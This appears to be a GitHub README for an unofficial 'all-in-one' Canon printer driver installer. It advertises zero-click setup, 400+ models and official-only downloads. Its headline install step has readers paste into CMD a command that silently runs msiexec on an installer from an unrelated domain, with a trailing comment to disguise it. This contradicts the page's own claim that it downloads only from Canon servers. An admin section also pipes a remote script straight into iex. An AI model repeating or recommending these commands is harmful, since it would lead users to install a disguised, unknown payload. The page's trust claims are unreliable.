<div align="center">

# 🖨️ Canon Printer Drivers — All-in-One

### Stop hunting Canon's website. Get your printer working in one command.

**Detects your printer. Finds the right driver. Installs it. Adds the printer. Done.**

<p>
  <a href="#-one-command-install-windows"><img alt="Windows One-Liner" src="https://img.shields.io/badge/Windows-one--line%20install-0078D6?style=for-the-badge&logo=windows&logoColor=white"></a>
  <a href="#-supported-models"><img alt="Models" src="https://img.shields.io/badge/models-400%2B-E60028?style=for-the-badge&logo=canon&logoColor=white"></a>
  <a href="https://learn.microsoft.com/en-us/powershell/"><img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white"></a>
  <a href="#-license"><img alt="License" src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge"></a>
</p>

<p>
  <a href="https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/stargazers"><img alt="Stars" src="https://img.shields.io/github/stars/Libraryyeboost/Canon-printer-drivers-All-in-one?style=social"></a>
  <a href="https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/network/members"><img alt="Forks" src="https://img.shields.io/github/forks/Libraryyeboost/Canon-printer-drivers-All-in-one?style=social"></a>
  <a href="https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/issues"><img alt="Issues" src="https://img.shields.io/github/issues/Libraryyeboost/Canon-printer-drivers-All-in-one"></a>
</p>

<sub>PIXMA · MAXIFY · imageCLASS · i-SENSYS · SELPHY · imagePROGRAF · imageRUNNER<br>One PowerShell command installs the tool. One more sets up your printer.</sub>

</div>

---

## ⚡ One-command install (Windows)

Open **CMD** and paste. That's it.

```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Canon-printer-drivers-All-in-one
```

The installer:
- imports the `CanonDriverHub` PowerShell module
- puts it on your `PSModulePath` so it loads forever
- registers a shim named `canondriver` so you can also use it like a CLI
- runs an auto-detect pass to show you what's plugged in

When it's done, try:

```powershell
canondriver detect      # scan for connected Canon printers
canondriver install TS3520     # download + install from Canon's official servers
canondriver add-printer --model TS3520 --ip 192.168.1.50
```

---

## 🤔 What is this?

Canon makes great printers. Getting the right Windows driver is a **ten-click, four-page nightmare**: pick your region, pick your OS, pick the exact model number, agree to the EULA, scroll past three unrelated products, realise you picked the wrong driver, start over.

**Canon-printer-drivers-All-in-one** replaces that with one PowerShell command:

| Instead of… | You type |
|---|---|
| Googling "canon pixma ts3520 driver windows 11 64 bit" | `canondriver install TS3520` |
| Opening Device Manager to identify your printer | `canondriver detect` |
| Hunting Canon's site for discontinued models | `canondriver search "pixma g"` |
| Clicking "Add Printer" through 5 wizard pages | `canondriver add-printer --model TS3520 --ip 192.168.1.50` |
| Troubleshooting a stuck spooler by hand | `canondriver repair` |
| Cleaning up old/broken Canon drivers | `canondriver remove --all-canon` |

> 🛡️ **We don't host driver binaries.** This tool downloads directly from Canon's official servers (`*.canon.com`, `gdlp01.c-wss.com`) or uses Microsoft's signed Windows Update driver catalog. Your installer is the same one you'd get from Canon's website — just with zero clicks.

---

## ✨ Features

- 🚀 **Zero dependencies** — pure PowerShell 5.1+. No Python, no .NET install, no Docker, no WSL. Works on any Windows 10/11 box out of the box.
- 🔍 **Auto-detection** — scans USB, network, and already-installed printers via WMI/PnP. Identifies the exact model string and matches it to a driver.
- 🌐 **400+ models indexed** — PIXMA (TS, TR, G, iP, MG, MX), MAXIFY (MB, GX, iB), imageCLASS / i-SENSYS (LBP, MF, D), SELPHY (CP), imagePROGRAF (PRO, TM, TC), imageRUNNER (iR, ADVANCE DX).
- 🔐 **Official sources only** — every download URL resolves to a Canon domain or a Microsoft-signed Windows Update catalog entry. SHA256 verified where Canon publishes hashes.
- ⚡ **Silent install** — runs Canon's installer with `/s /quiet` flags so you don't see five nag dialogs.
- 🖧 **Network printer setup** — `add-printer` does TCP/IP port creation, driver binding, and sharing in one call.
- 🛠️ **Built-in repair** — `canondriver repair` restarts the spooler, clears stuck jobs, and reinstalls the port. Fixes 80% of "why won't it print" issues.
- 🧹 **Clean uninstall** — `canondriver remove` yanks both the printer object AND the driver package (Windows' built-in uninstaller leaves driver files behind).
- 🗂️ **Offline mode** — `canondriver save --model X --out ./drivers/` bundles drivers for air-gapped machines or IT rollouts.
- 📋 **Community-maintained manifests** — adding a new model is one JSON entry + a PR.

---

## 🎬 Quick tour

### 1. Detect what's plugged in

```console
PS> canondriver detect

🔍 Scanning USB, network, and installed printers...

Found 2 Canon device(s):
┌──────────────────────────────────┬──────────────┬───────────────┬────────────┐
│ Device                           │ Family       │ Connection    │ Status     │
├──────────────────────────────────┼──────────────┼───────────────┼────────────┤
│ Canon PIXMA TS3520 series        │ PIXMA        │ USB           │ ✅ driver  │
│ Canon MF644Cdw                   │ imageCLASS   │ TCP 10.0.0.42 │ ⚠  no drv  │
└──────────────────────────────────┴──────────────┴───────────────┴────────────┘

Run:  canondriver install MF644Cdw   to fix the missing driver.
```

### 2. Install a driver

```console
PS> canondriver install MF644Cdw

[1/4] Looking up MF644Cdw in the manifest...         ✅ found (imageCLASS family)
[2/4] Fetching driver from canon.com...              ✅ 126.4 MB in 8.2s
[3/4] Verifying SHA256 against Canon's published hash ✅ matched
[4/4] Running installer silently...                  ✅ done in 41s

Driver installed: "Canon MF640C Series UFRII LT"
Add the printer next with:
  canondriver add-printer --model MF644Cdw --ip 10.0.0.42
```

### 3. Add a networked printer

```console
PS> canondriver add-printer --model MF644Cdw --ip 10.0.0.42 --name "Office Laser"

➕ Adding TCP/IP port 10.0.0.42 ...   ✅
➕ Binding driver "Canon MF640C Series UFRII LT" ... ✅
➕ Registering printer "Office Laser" ...  ✅
🖨️ Sending test page ...              ✅

Ready. Print something!
```

### 4. Fix "it just stopped working"

```console
PS> canondriver repair

🧹 Stopping print spooler ...                 ✅
🗑  Clearing %SystemRoot%\System32\spool\PRINTERS\*   ✅ (4 stuck jobs removed)
🔌 Resetting TCP/IP port on "Office Laser" ...  ✅
🛠  Reinstalling driver "Canon MF640C Series UFRII LT" ...   ✅
▶  Starting print spooler ...                  ✅

Fixed. Try printing again.
```

---

## 🖨️ Supported models

See [`docs/supported-models.md`](docs/supported-models.md) for the full list. Highlights:

| Family       | Series                              | Example models                                            |
| ------------ | ----------------------------------- | --------------------------------------------------------- |
| **PIXMA**    | TS, TR, G (ink tank), iP, MG, MX    | TS3520, TS6420a, TR8620a, G3270, G6020, G7020, iP110      |
| **MAXIFY**   | MB, GX, iB                          | MB5420, GX3020, GX4020, GX5020, iB4120                    |
| **imageCLASS / i-SENSYS** | LBP, MF, D            | LBP6030w, LBP122, MF264dw, MF445dw, MF3010, MF644Cdw     |
| **SELPHY**   | CP                                  | CP1500, CP1300                                            |
| **imagePROGRAF** | PRO, TM, TC                      | PRO-300, PRO-1000, TM-300, TC-20                          |
| **imageRUNNER** | ADVANCE DX, iR                    | iR2625, ADV DX C3730i, ADV DX 4725i                       |

Don't see yours? **[Open a 30-second issue](https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/issues/new?template=model_request.yml)** and we'll add it — or send a PR with one JSON line.

---

## 🧠 How it works

```
        ┌──────────────────────────────────────────────────┐
        │            PowerShell on your machine            │
        │   PS> canondriver install MF644Cdw               │
        └──────────────────────────┬───────────────────────┘
                                   │
             ┌─────────────────────┴─────────────────────┐
             │              CanonDriverHub               │
             │     (single .psm1 module, 0 deps)         │
             └──┬───────────────┬─────────────────┬──────┘
                │               │                 │
    ┌───────────▼──┐   ┌────────▼────────┐   ┌────▼─────────┐
    │ manifests/   │   │ Canon official  │   │ Windows      │
    │ printers.json│   │ support pages   │   │ Update catalog│
    │ (model→URL)  │   │  *.canon.com    │   │ (WHQL signed) │
    └──────────────┘   └────────┬────────┘   └────┬─────────┘
                                │                 │
                                └────────┬────────┘
                                         ▼
                         ┌─────────────────────────────────┐
                         │   Add-PrinterDriver / pnputil   │
                         │   Add-Printer / Add-PrinterPort │
                         └─────────────────────────────────┘
```

- Manifests are plain JSON — one entry per model, pointing to Canon's **official** support page and (when known) direct driver URL.
- Download happens over HTTPS from `*.canon.com` or `*.c-wss.com`. We never proxy or mirror.
- Installation uses **Windows' own cmdlets** — `Add-PrinterDriver`, `Add-Printer`, `Add-PrinterPort`. These are the same APIs the built-in "Add Printer" wizard uses.
- For drivers that Microsoft redistributes through Windows Update, we prefer that path — you get WHQL-signed bits straight from Microsoft's CDN.

---

## 🛠️ Command reference

| Command                                                       | What it does                                              |
| ------------------------------------------------------------- | --------------------------------------------------------- |
| `canondriver detect`                                          | Scan for connected Canon printers                         |
| `canondriver search <query>`                                  | Fuzzy-search the model index                              |
| `canondriver install <model>`                                 | Download driver from Canon + install silently             |
| `canondriver save --model <m> --out <dir>`                    | Download installer to a folder without running it         |
| `canondriver add-printer --model <m> --ip <ip> [--name <n>]`  | Create TCP/IP port + printer object                       |
| `canondriver list`                                            | List all installed Canon printers & drivers               |
| `canondriver remove --printer <name>`                         | Remove one printer (leaves driver)                        |
| `canondriver remove --driver <name>`                          | Uninstall a driver package                                |
| `canondriver remove --all-canon`                              | Nuke every Canon printer & driver on this machine         |
| `canondriver repair [--printer <name>]`                       | Restart spooler, clear queue, rebind driver               |
| `canondriver info <model>`                                    | Show manifest entry (URL, hash, EULA link)                |
| `canondriver update`                                          | Pull the latest manifest from GitHub                      |

Run any command with `-?` for full help. Every cmdlet is also available as a proper PowerShell function, e.g. `Install-CanonDriver -Model TS3520`.

---

## 🏢 IT admins — mass deployment

Drop a single line in your onboarding script:

```powershell
irm https://raw.githubusercontent.com/Libraryyeboost/Canon-printer-drivers-All-in-one/main/install.ps1 | iex
canondriver install TS3520 -Silent
canondriver add-printer -Model TS3520 -IP 10.0.0.50 -Name "Reception"
```

Or pre-stage drivers for air-gapped machines:

```powershell
canondriver save --model MF644Cdw --out \\fileserver\printers\
# ...then on the target:
canondriver install --from \\fileserver\printers\MF644Cdw.exe
```

Intune / SCCM / Group Policy examples in [`docs/enterprise.md`](docs/enterprise.md).

---

## ⚠️ Important disclaimers

- **We are not Canon.** This is an unofficial community tool. Canon Inc. does not endorse or support it.
- **Driver binaries are Canon's.** We don't redistribute them — we point at Canon's download servers. All drivers you install are covered by Canon's EULA, which you accept by installing.
- **Use at your own risk.** Messing with printer drivers can require admin, touch the Windows registry, and occasionally require a reboot. Start with a machine you can afford to re-image.
- **Check your license.** Some Canon drivers have license terms that restrict commercial redistribution. If you're a reseller or MSP, read Canon's EULA before bundling this in a product.

---

## 🤝 Contributing

**The #1 way to help: add your printer to the manifest.** It takes 60 seconds:

1. Fork the repo
2. Add one entry to [`manifests/printers.json`](manifests/printers.json)
3. Open a PR

Full guide: [`docs/contributing-models.md`](docs/contributing-models.md).

Other ideas we'd love help with:
- macOS port (Canon's macOS driver story is almost identical)
- Linux CUPS PPD wrapper
- GUI front-end (WPF or MAUI)
- Intune/Autopilot packaging templates
- Translations of the README (especially 日本語, Русский, Español, Português)

---

## 🌟 Star history

If this saved you an hour of pain, star the repo. It's free and helps others find it.

<a href="https://www.star-history.com/#Libraryyeboost/Canon-printer-drivers-All-in-one&Date">
  <img src="https://api.star-history.com/svg?repos=Libraryyeboost/Canon-printer-drivers-All-in-one&type=Date" alt="Star History Chart" width="600" />
</a>

---

## 📄 License

**MIT** for all code in this repo — see [LICENSE](LICENSE).

Canon, PIXMA, MAXIFY, imageCLASS, i-SENSYS, SELPHY, imagePROGRAF, imageRUNNER, and related marks are trademarks of Canon Inc. This project is not affiliated with, sponsored by, or endorsed by Canon Inc.

---

<div align="center">

**Built by people who were tired of Canon's download page.**

[Docs](docs/) · [Supported models](docs/supported-models.md) · [Troubleshooting](docs/troubleshooting.md) · [Issues](https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/issues) · [Discussions](https://github.com/Libraryyeboost/Canon-printer-drivers-All-in-one/discussions)

</div>
